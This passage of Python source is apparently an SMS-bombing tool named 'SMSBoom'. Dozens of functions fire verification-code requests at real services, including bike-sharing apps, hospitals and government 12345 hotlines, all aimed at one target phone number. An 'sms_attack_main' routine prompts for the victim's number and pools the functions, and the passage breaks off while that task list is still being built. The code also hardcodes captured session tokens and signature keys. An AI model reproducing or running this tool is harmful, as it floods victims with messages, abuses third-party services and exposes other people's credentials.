        "content-type": "application/json",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.48(0x18003030) NetType/WIFI Language/zh_CN",
        "Referer": "https://servicewechat.com/wx0e75b2cce830f980/37/page-frame.html"
    }
    data108 = {"phone": phone}

    response108 = requests.post(url108, headers=headers108, data=json.dumps(data108))

def request_url109():
    url109 = "https://zcclient.uqbike.com/customer/login/sms"
    headers109 = {
        "token": "",
        "content-type": "application/json",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.48(0x18003030) NetType/WIFI Language/zh_CN",
        "Referer": "https://servicewechat.com/wx889c3c5d7bc8dc51/14/page-frame.html"
    }
    data109 = {
        "phone": phone,
        "appId": "wx889c3c5d7bc8dc51",
        "wxLoginCode": "0c3uRo000ZiAiS1eLd300SX4Bo4uRo0N",
        "loginType": 1
    }

    response109 = requests.post(url109, headers=headers109, data=json.dumps(data109))

def request_url110():
    url110 = "https://hdg.u-ebike.com:19082/user/system/checkUsername"
    headers110 = {
        "content-type": "application/json",
        "X-Authorization": "",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.48(0x18003030) NetType/WIFI Language/zh_CN",
        "Referer": "https://servicewechat.com/wx206637e1780ccd3c/21/page-frame.html"
    }
    data110 = {"username": phone}

    response110 = requests.post(url110, headers=headers110, data=json.dumps(data110))

def request_url111():
    url111 = "https://dy.qiyiqixing.com/mini-member-api/blade-resource/sms/endpoint/send-validate"
    headers111 = {
        "Content-Type": "application/json",
        "Blade-Auth": "",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.48(0x18003030) NetType/WIFI Language/zh_CN",
        "Referer": "https://servicewechat.com/wxc8e98aadbeac1abe/68/page-frame.html"
    }
    data111 = {
        "phone": phone,
        "type": 1
    }

    response111 = requests.post(url111, json=data111, headers=headers111)

def request_url112():
    url112 = "https://mini.ydinggo.com/noticeCenter/idCode/send"
    headers112 = {
        "Host": "mini.ydinggo.com",
        "Connection": "keep-alive",
        "openId": "o8Q615GTwlmvi4Zwa5GqClv2A5ho",
        "X-Mgs-Proxy-Signature": "9de3ef88fa47921507b6a84c337e882a",
        "X-Mgs-Proxy-Signature-Secret-Key": "63f63441f61fb557099df7a74a070c52",
        "token": "",
        "content-type": "application/json",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.48(0x18003030) NetType/WIFI Language/zh_CN",
        "Referer": "https://servicewechat.com/wx166fbbc23ae5a2fe/207/page-frame.html"
    }
    data112 = {
        "identity": 1,
        "mobile": phone,
        "type": 1
    }

    response112 = requests.get(url112, params=data112, headers=headers112)

def request_url113():
    url113 = "https://client3.uqbike.cn/sms/sendAuthCode.do?accountId=10964&phone=" + phone
    headers113 = {
        "Host": "client3.uqbike.cn",
        "Connection": "keep-alive",
        "U-App-VERSION": "3.8.1",
        "T-Mp-En-Version": "release",
        "content-type": "application/json",
        "userId": "-1",
        "T-App-Version": "3.8.1",
        "orderSource": "3",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.48(0x18003030) NetType/WIFI Language/zh_CN",
        "Referer": "https://servicewechat.com/wxaa0728b53355068c/10/page-frame.html"
    }

    response113 = requests.get(url113, headers=headers113)

def request_url114():
    url114 = "https://api.taxi.lehuicloud.cn/app/verifyCode/sendVerifyCode"
    headers114 = {
        "Host": "api.taxi.lehuicloud.cn",
        "Connection": "keep-alive",
        "Authorization": "[object Null]",
        "content-type": "application/json",
        "tenant_id": "50",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.48(0x18003030) NetType/WIFI Language/zh_CN",
        "Referer": "https://servicewechat.com/wx6dbbe7b84e7a37a3/19/page-frame.html"
    }
    data114 = {
        "phone": phone,
        "type": 1
    }

    response114 = requests.get(url114, params=data114, headers=headers114)
def request_url115():
    url115 = "https://client6.uqbike.cn/sms/sendAuthCode.do?accountId=100310&phone=" + phone
    headers115 = {
        "Host": "client6.uqbike.cn",
        "Connection": "keep-alive",
        "U-App-VERSION": "3.8.1",
        "T-Mp-En-Version": "release",
        "content-type": "application/json",
        "userId": "-1",
        "T-App-Version": "3.8.1",
        "orderSource": "3",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.48(0x18003030) NetType/WIFI Language/zh_CN",
        "Referer": "https://servicewechat.com/wxb5516c6e8983b9b7/1/page-frame.html"
    }

    response115 = requests.get(url115, headers=headers115)

def request_url116():
    url116 = "https://www.xytongcheng.top/prod-api/app/personal/sendTencent?phone=" + phone
    headers116 = {
        "Host": "www.xytongcheng.top",
        "Connection": "keep-alive",
        "content-type": "application/json;charset=utf-8",
        "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpblR5cGUiOiJsb2dpbiIsImxvZ2luSWQiOiJhcHBfd3hfdXNlcjoxODAxNjYzOTA3NDg5NjExNzc4Iiwicm5TdHIiOiJISGtoOWVTakxKaG1kaUo4UlVPTkJVVUJ4dVAxNWdiZSJ9.1EpyKXSjQ8c0DEoiMWts6tmhjrbsvHTVUdBj7QlWVDU",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.48(0x18003030) NetType/WIFI Language/zh_CN",
        "Referer": "https://servicewechat.com/wxaf508427c211540c/20/page-frame.html"
    }

    response116 = requests.get(url116, headers=headers116)

def request_url117():
    url117 = "https://client2.uqbike.cn/sms/sendAuthCode.do?accountId=100233&phone=" + phone
    headers117 = {
        "Host": "client2.uqbike.cn",
        "Connection": "keep-alive",
        "U-App-VERSION": "3.8.1",
        "T-Mp-En-Version": "release",
        "content-type": "application/json",
        "userId": "-1",
        "T-App-Version": "3.8.1",
        "orderSource": "3",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.48(0x18003030) NetType/WIFI Language/zh_CN",
        "Referer": "https://servicewechat.com/wxf4467402d894bb83/11/page-frame.html"
    }

    response117 = requests.get(url117, headers=headers117)

def request_url118():
    url118 = "https://client4.uqbike.cn/sms/sendAuthCode.do?accountId=200529&phone=" + phone
    headers118 = {
        "Host": "client4.uqbike.cn",
        "Connection": "keep-alive",
        "U-App-VERSION": "3.8.1",
        "T-Mp-En-Version": "release",
        "content-type": "application/json",
        "userId": "-1",
        "T-App-Version": "3.8.1",
        "orderSource": "3",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.48(0x18003030) NetType/WIFI Language/zh_CN",
        "Referer": "https://servicewechat.com/wx4d3d20e11386dce7/1/page-frame.html"
    }

    response118 = requests.get(url118, headers=headers118)

def request_url119():
    url119 = "https://bike.ledear.cn/api/user/code"
    headers119 = {
        "Host": "bike.ledear.cn",
        "Connection": "keep-alive",
        "token": "",
        "content-type": "application/json",
        "brand_area_id": "1130",
        "source_type": "1",
        "area_id": "1132",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.48(0x18003030) NetType/WIFI Language/zh_CN",
        "Referer": "https://servicewechat.com/wxe32d303838f9fe9c/57/page-frame.html"
    }
    data119 = {
        "phone": phone,
        "brandAreaId": 1130
    }

    response119 = requests.get(url119, params=data119, headers=headers119)

def request_url120():
    url120 = "https://client.gxeszx.com/sms/sendAuthCode.do?accountId=5000&phone=" + phone
    headers120 = {
        "Host": "client.gxeszx.com",
        "Connection": "keep-alive",
        "orderSource": "3",
        "content-type": "application/json",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.48(0x18003030) NetType/WIFI Language/zh_CN",
        "Referer": "https://servicewechat.com/wxd051b0ba558c8459/95/page-frame.html"
    }

    response120 = requests.get(url120, headers=headers120)

def request_url121():
    url121 = "https://client4.uqbike.cn/sms/sendAuthCode.do?accountId=200030&phone=" + phone
    headers121 = {
        "Host": "client4.uqbike.cn",
        "Connection": "keep-alive",
        "U-App-VERSION": "3.8.1",
        "T-Mp-En-Version": "release",
        "content-type": "application/json",
        "userId": "-1",
        "T-App-Version": "3.8.1",
        "orderSource": "3",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.48(0x18003030) NetType/WIFI Language/zh_CN",
        "Referer": "https://servicewechat.com/wxcacb0c0ea343a4a1/8/page-frame.html"
    }

    response121 = requests.get(url121, headers=headers121)

def request_url122():
    url122 = "https://client2.uqbike.cn/sms/sendAuthCode.do?accountId=100798&phone=" + phone
    headers122 = {
        "Host": "client2.uqbike.cn",
        "Connection": "keep-alive",
        "U-App-VERSION": "3.8.1",
        "T-Mp-En-Version": "release",
        "content-type": "application/json",
        "userId": "-1",
        "T-App-Version": "3.8.1",
        "orderSource": "3",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.48(0x18003030) NetType/WIFI Language/zh_CN",
        "Referer": "https://servicewechat.com/wx45c13a1c34dc7a87/7/page-frame.html"
    }

    response122 = requests.get(url122, headers=headers122)

def request_url123():
    url123 = "https://client4.uqbike.cn/sms/sendAuthCode.do?accountId=17153&phone=" + phone
    headers123 = {
        "Host": "client4.uqbike.cn",
        "Connection": "keep-alive",
        "U-App-VERSION": "3.8.1",
        "T-Mp-En-Version": "release",
        "content-type": "application/json",
        "userId": "-1",
        "T-App-Version": "3.8.1",
        "orderSource": "3",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.48(0x18003030) NetType/WIFI Language/zh_CN",
        "Referer": "https://servicewechat.com/wx87595b8679d059bc/8/page-frame.html"
    }

    response123 = requests.get(url123, headers=headers123)

def request_url124():
    url124 = "https://client4.uqbike.cn/sms/sendAuthCode.do?accountId=200116&phone=" + phone
    headers124 = {
        "Host": "client4.uqbike.cn",
        "Connection": "keep-alive",
        "U-App-VERSION": "3.8.1",
        "T-Mp-En-Version": "release",
        "content-type": "application/json",
        "userId": "-1",
        "T-App-Version": "3.8.1",
        "orderSource": "3",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.48(0x18003030) NetType/WIFI Language/zh_CN",
        "Referer": "https://servicewechat.com/wxb54338c6505c31d3/5/page-frame.html"
    }

    response124 = requests.get(url124, headers=headers124)

def request_url125():
    url125 = "https://api.app.bmsgps.com/new_energy/server/api/web/"
    headers125 = {
        "Host": "api.app.bmsgps.com",
        "Connection": "keep-alive",
        "content-type": "application/json",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.48(0x18003030) NetType/WIFI Language/zh_CN",
        "Referer": "https://servicewechat.com/wx24e0a4fe3af7c36a/2/page-frame.html"
    }
    data125 = {
        "r": "user/verify-code",
        "appid": "wx24e0a4fe3af7c36a",
        "phone": phone,
        "token": "",
        "v": "4.1.2024051401"
    }

    response125 = requests.get(url125, params=data125, headers=headers125)

def request_url126():
    url126 = "https://wechat.fnjkj.cn/battery_wechat//common/sendMessage"
    headers126 = {
        "Host": "wechat.fnjkj.cn",
        "Connection": "keep-alive",
        "content-type": "application/x-www-form-urlencoded",
        "app-type": "MULTI_SERVICE",
        "app-id": "wxbc95682e1451b589",
        "fuLabel": "none",
        "channel": "184",
        "appId": "wxbc95682e1451b589",
        "appType": "weapp",
        "identify": "YQXHD",
        "platform": "miniprogram",
        "access-token": "",
        "cnrLabel": "110000",
        "sign": "YQXHD",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.48(0x18003030) NetType/WIFI Language/zh_CN",
        "Referer": "https://servicewechat.com/wxbc95682e1451b589/4/page-frame.html"
    }
    data126 = {
        "phone": phone,
        "sign": "YQXHD"
    }

    response126 = requests.get(url126, params=data126, headers=headers126)

def request_url127():
    url127 = "https://bike.ledear.cn/api/user/code"
    headers127 = {
        "Host": "bike.ledear.cn",
        "Connection": "keep-alive",
        "token": "",
        "content-type": "application/json",
        "brand_area_id": "1513",
        "source_type": "1",
        "area_id": "1515",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.48(0x18003030) NetType/WIFI Language/zh_CN",
        "Referer": "https://servicewechat.com/wx5b873e0cf7df3be6/37/page-frame.html"
    }
    data127 = {
        "phone": phone,
        "brandAreaId": "1513"
    }

    response127 = requests.get(url127, params=data127, headers=headers127)

def request_url128():
    url128 = "https://service.fnjkj.cn/battery_wechat//common/sendMessage"
    headers128 = {
        "Host": "service.fnjkj.cn",
        "Connection": "keep-alive",
        "identify": "ALHS",
        "content-type": "application/x-www-form-urlencoded",
        "access-token": "",
        "app-id": "",
        "platform": "miniprogram",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.48(0x18003030) NetType/WIFI Language/zh_CN",
        "Referer": "https://servicewechat.com/wx879aafab50fe323f/4/page-frame.html"
    }
    data128 = {
        "phone": phone,
        "sign": "ALHS"
    }

    response128 = requests.get(url128, params=data128, headers=headers128)

def request_url129():
    url129 = "https://lyapp.lyscycle.com/rest/userlogin/setVerificationCode.ashx"
    headers129 = {
        "Host": "lyapp.lyscycle.com",
        "Connection": "keep-alive",
        "content-type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.48(0x18003030) NetType/WIFI Language/zh_CN",
        "Referer": "https://servicewechat.com/wx9efc499a564eacf1/49/page-frame.html"
    }
    data129 = {
        "phone": phone,
        "phoneVersion": "iOS 14.7",
        "softVersion": "8.0.48"
    }

    response129 = requests.get(url129, params=data129, headers=headers129)

def request_url130():
    url130 = "https://test.cheboyi.com/bk-user-api/api/user/sms/sendSmsCode/CBYZHQX-XCX/" + phone
    headers130 = {
        "Host": "test.cheboyi.com",
        "Connection": "keep-alive",
        "content-type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.48(0x18003030) NetType/WIFI Language/zh_CN",
        "Referer": "https://servicewechat.com/wx8d01840fbaa0bec6/18/page-frame.html"
    }

    response130 = requests.get(url130, headers=headers130)

def request_url131():
    url131 = "https://client.qczhixing.com/sms/sendAuthCode.do?accountId=11493&phone=" + phone
    headers131 = {
        "Host": "client.qczhixing.com",
        "Connection": "keep-alive",
        "U-App-VERSION": "4.0.0",
        "T-Mp-En-Version": "release",
        "content-type": "application/json",
        "userId": "-1",
        "T-App-Version": "4.0.0",
        "orderSource": "3",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.48(0x18003030) NetType/WIFI Language/zh_CN",
        "Referer": "https://servicewechat.com/wx65598c75a39a173d/42/page-frame.html"
    }

    response131 = requests.get(url131, headers=headers131)

def request_url132():
    url132 = "https://client.uqbike.cn/sms/sendAuthCode.do?accountId=10604&phone=" + phone
    headers132 = {
        "Host": "client.uqbike.cn",
        "Connection": "keep-alive",
        "U-App-VERSION": "3.8.1",
        "T-Mp-En-Version": "release",
        "content-type": "application/json",
        "userId": "-1",
        "T-App-Version": "3.8.1",
        "orderSource": "3",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.48(0x18003030) NetType/WIFI Language/zh_CN",
        "Referer": "https://servicewechat.com/wxd922338acad06e8f/24/page-frame.html"
    }

    response132 = requests.get(url132, headers=headers132)

def request_url133():
    url133 = "http://12345wx.qingdao.gov.cn/weixin/api/account/sendsms/" + phone
    headers133 = {
        "Host": "12345wx.qingdao.gov.cn",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.48(0x18003030) NetType/WIFI Language/zh_CN",
        "Referer": "http://12345wx.qingdao.gov.cn/PersonCenter/AccountBind?response_type=code&code=081gtFkl2dhxDd4Xllml2sU84u1gtFkF&state=STATE",
        "Accept-Language": "zh-cn",
        "X-Requested-With": "XMLHttpRequest"
    }

    response133 = requests.get(url133, headers=headers133)

def request_url134():
    url134 = "http://36.134.81.191/xyrest/rest/checkcode/getCheckCode"
    headers134 = {
        "Content-Type": "application/json;charset=UTF-8",
        "Origin": "http://12345.xinyu.gov.cn",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
        "Accept": "application/json",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.48(0x18003030) NetType/WIFI Language/zh_CN",
        "Referer": "http://12345.xinyu.gov.cn/",
        "Accept-Language": "zh-cn"
    }
    data134 = {
        "token": "",
        "params": {
            "mobile": phone
        }
    }

    response134 = requests.post(url134, headers=headers134, data=json.dumps(data134))

def request_url135():
    url135 = "http://221.14.255.62:8088/cns-bmfw-webrest/rest/cnsverifywebuserbycode/getSqCheckCode"
    headers135 = {
        "Content-Type": "application/json;charset=UTF-8",
        "Origin": "http://12345.xzspzwxxglj.shangqiu.gov.cn:8088",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
        "Accept": "application/json",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.48(0x18003030) NetType/WIFI Language/zh_CN",
        "Referer": "http://12345.xzspzwxxglj.shangqiu.gov.cn:8088/",
        "Accept-Language": "zh-cn"
    }
    data135 = {
        "params": {
            "mobile": phone,
            "source": 'WX'
        }
    }

    response135 = requests.post(url135, headers=headers135, data=json.dumps(data135))

def request_url136():
    url136 = "http://szxx.yantai.gov.cn/weixin/weixin/api/sso/sendMessage"
    headers136 = {
        "Accept": "*/*",
        "X-Requested-With": "XMLHttpRequest",
        "Accept-Language": "zh-cn",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "http://szxx.yantai.gov.cn",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.48(0x18003030) NetType/WIFI Language/zh_CN",
        "Connection": "keep-alive",
        "Referer": "http://szxx.yantai.gov.cn/weixin/MicroAppeal/Appeal/Registor?openid=oh1Id6FruJFAZ1WpcdwmEC8J2I84"
    }
    data136 = {
        "mobiles": phone
    }

    response136 = requests.post(url136, headers=headers136, data=data136)
    
def send_request18(phone):
    """请求18: UQbike"""
    url = 'https://client6.uqbike.cn/api/user/sendSmsCode'
    headers = {
        'Host': 'client6.uqbike.cn',
        'Connection': 'keep-alive',
        'orderSource': '3',
        'T-Mp-En-Version': 'release',
        'content-type': 'application/x-www-form-urlencoded',
        'T-App-Version': '5.1.0',
        'U-App-VERSION': '5.1.0',
        'userId': '[object Undefined]',
        'charset': 'utf-8',
        'Referer': 'https://servicewechat.com/wx2b8788c319a5f46e/7/page-frame.html',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 14; 22081212C Build/UKQ1.230917.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.180 Mobile Safari/537.36 XWEB/1380085 MMWEBSDK/20250503 MMWEBID/5998 MicroMessenger/8.0.61.2880(0x28003D58) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android',
        'Accept-Encoding': 'gzip, deflate, br'
    }
    data = {'accountId': '700079', 'phone': phone}
    try:
        requests.post(url, headers=headers, data=data, timeout=10)
        return True
    except:
        return False

def send_request19(phone):
    """请求19: 车托车"""
    url = 'https://api.chetuoche.net/api/user/sendYzmV2'
    headers = {'Content-Type': 'application/json'}
    data = {"user_type": "customer", "phone": phone, "purpose": "2", "smsType": "1"}
    try:
        requests.post(url, headers=headers, json=data, timeout=10)
        return True
    except:
        return False

def send_request20(phone):
    """发送安医附院短信验证码请求"""
    url = f"https://zsyy2.ayfy.com/aydyfy/rest/sendPhoneCode?phone={phone}&openId=oZGPm5SdJqrEidq5Z5EdqJpLOUGM&context=3&unionid=oJlM4wVGAEWycRCrbC5Iy0m9OUFY"
    try:
        requests.post(url, timeout=10)  
        return True
    except:
        return False  

def send_request21(phone):
    """发送和仁科技短信验证码请求"""
    url = 'https://saas-ih1.healthan.net/saas/card/api/sendMsg'
    headers = {
        'Host': 'saas-ih1.healthan.net',
        'Connection': 'keep-alive',
        'sourceid': '001',
        'charset': 'utf-8',
        'test': '',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; V2002A Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/134.0.6998.136 Mobile Safari/537.36 XWEB/1340153 MMWEBSDK/20240404 MMWEBID/5568 MicroMessenger/Lite Luggage/4.2.2 QQ/9.2.5.28755 NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android',
        'terminalid': '1434131120002231225165139',
        'Accept-Encoding': 'gzip,compress,br,deflate',
        'token': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpblR5cGUiOiJsb2dpbiIsImxvZ2luSWQiOiIxNDM0MTMxXzE0MzQxMzExMjAwMDIyMzEyMjUxNjUxMzlfb05Wa09zMHdLdjF6dXl2d19IN1RuVDdacTZRVSIsInJuU3RyIjoibEZJMnpqSUh4N1RhTlZoSENwMnJwZmx3V1FNZHFNUXAifQ.s89fwVPXH_r2sYnENc5AB0G7uKwn8znbRu3KV3thk-k',
        'environment': 'dev',
        'requestid': '0e5065bb9f732af7ae9023c71c00df07',
        'tenantid': '1434131',
        'content-type': 'application/json',
        'Referer': 'https://servicewechat.com/wx3e438de96ea24d6d/101/page-frame.html'
    }
    data = {
        "mobile": phone,
        "source": "3"
    }
    try:
        requests.post(url, headers=headers, json=data, timeout=10)
        return True
    except:
        return False

def send_request22(phone):
    """发送武汉协和医院短信验证码请求"""
    url = 'https://beta.whsry.net/Sms/send'
    headers = {
        'Host': 'beta.whsry.net',
        'Connection': 'keep-alive',
        'charset': 'utf-8',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; V2002A Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/134.0.6998.136 Mobile Safari/537.36 XWEB/1340153 MMWEBSDK/20240404 MMWEBID/5568 MicroMessenger/Lite Luggage/4.2.2 QQ/9.2.5.28755 NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android',
        'content-type': 'application/json',
        'Accept-Encoding': 'gzip,compress,br,deflate',
        'Referer': 'https://servicewechat.com/wx77f1337dcb688776/35/page-frame.html'
    }
    data = {
        "phone": phone,
        "type": 5,
        "country_code": "+86"
    }
    try:
        requests.post(url, headers=headers, json=data, timeout=10)
        return True
    except:
        return False      

def sms_attack_main():
    """短信发送核心功能（原第二个main函数，已重命名）"""
    clear_screen()
    SMS_logo()
    typewriter(f"SMSBoom系统启动中...", Fore.CYAN)
    disclaimer()
    
    # 获取手机号（带输入验证）
    while True:
        phone = input(f"{Fore.CYAN}请输入目标手机号: {Style.RESET_ALL}")
        if len(phone) == 11 and phone.isdigit():
            break
        SMS(f"{Fore.RED}✗ 请输入11位有效手机号{Style.RESET_ALL}")
    
    # 确认操作
    typewriter(f"{Fore.YELLOW}即将开始操作，目标号码: 不告诉你")
    confirm = input(f"{Fore.YELLOW}确认执行？(y/n): {Style.RESET_ALL}")
    if confirm.lower() != 'y':
        typewriter(f"{Fore.RED}操作已取消{Style.RESET_ALL}")
        return
    
    # 定义请求池
    base_tasks = [
        send_request1, send_request2, send_request3, 
        send_request6, send_request7, send_request8,
        send_request9, send_request10, send_request11,
        send_request12, send_request13, send_request14,
        send_request15, send_request16, send_request17,
        send_request18, send_request19,send_request20,send_request21,send_request22,        send_ghd_sms,
        send_ctrip_sms,
        send_lvcchong_sms,
        send_yakeyun_sms,
        send_ygj_sms,
        send_dsssp_sms,
        send_icharge_sms,
        send_bird_sms,
        send_hellobike_sms,
        send_myzhishi_sms,
        send_suzhiyouxuan_sms,
        send_jswxjy_sms,
        send_yangfedu_sms,
        send_yidivip_sms,
        send_hellobike_voice,
        send_linde_sms,
        send_dxzuji_sms,
        send_quzhououlan_sms,
        send_ddzuwu_sms,
        send_yimitongxun_sms,send_yimitongxun_sms,send_yimitongxun_sms,send_yimitongxun_sms,send_yimitongxun_sms,send_qixin18_sms,
        send_mikecrm_sms,
        send_dxmbaoxian_sms,
        send_planplus_sms,
        send_cindasc_sms,request_url1,request_url2,request_url3,request_url4,request_url5,request_url6,request_url7,request_url8,request_url9,request_url10,
request_url11,request_url12,request_url13,request_url14,request_url15,request_url16,request_url17,request_url18,request_url19,request_url20,
request_url21,request_url22,request_url23,request_url24,request_url25,request_url26,request_url27,request_url28,request_url29,request_url30,
request_url31,request_url32,request_url33,request_url34,request_url35,request_url36,request_url37,request_url38,request_url39,request_url40,
request_url41,request_url42,request_url43,request_url44,request_url45,request_url46,request_url47,request_url48,request_url49,request_url50,
request_url51,request_url52,request_url53,request_url54,request_url55,request_url56,request_url57,request_url58,request_url59,request_url60,
request_url61,request_url62,request_url63,request_url64,request_url66,request_url67,request_url68,request_url69,request_url70,
request_url71,request_url72,request_url73,request_url74,request_url75,request_url76,request_url77,request_url78,request_url79,request_url80,
request_url81,request_url82,request_url83,request_url84,request_url85,request_url86,request_url87,request_url88,request_url89,request_url90,
request_url91,request_url92,request_url93,request_url94,request_url95,request_url96,request_url97,request_url99,request_url100,
request_url101,request_url102,request_url103,request_url104,request_url105,request_url106,request_url107,request_url108,request_url109,request_url110,
request_url111,request_url112,request_url113,request_url114,request_url115,request_url116,request_url117,request_url118,request_url119,request_url120,
